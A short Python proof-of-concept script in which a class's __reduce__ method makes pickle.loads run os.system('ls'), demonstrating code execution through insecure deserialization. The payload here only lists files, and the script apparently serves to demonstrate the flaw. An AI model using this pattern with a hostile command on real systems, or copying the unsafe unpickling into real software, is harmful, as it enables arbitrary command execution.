import os
import pickle

class Vulnerable(object):
    def __reduce__(self):
        # Note: this will only list files in your directory.
        return (os.system, ('ls',))

def serialize_exploit():
    shellcode = pickle.dumps(Vulnerable())
    return shellcode

def insecure_deserialize(exploit_code):
    pickle.loads(exploit_code)

if __name__ == '__main__':
    shellcode = serialize_exploit()
    print('Obtaining files...')
    insecure_deserialize(shellcode)
